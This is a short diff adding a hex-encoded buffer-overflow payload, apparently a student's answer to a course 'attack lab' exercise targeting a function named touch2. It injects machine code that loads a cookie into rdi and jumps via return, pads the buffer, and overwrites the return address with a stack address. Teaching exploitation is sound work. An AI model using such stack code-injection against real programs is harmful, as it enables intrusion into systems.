@@ -1,0 +1,12 @@
+/* my code injection */
+48 c7 c7 77 6b 20 70 /* mov cookie into rdi */
+68 a3 18 40 00 /* push touch2 address to the stack */
+c3 /* return */
+
+/* fill up the rest of the buffer */ 
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+
+/* address of register %rsp */
+d8 ab 61 55 00 00 00 00
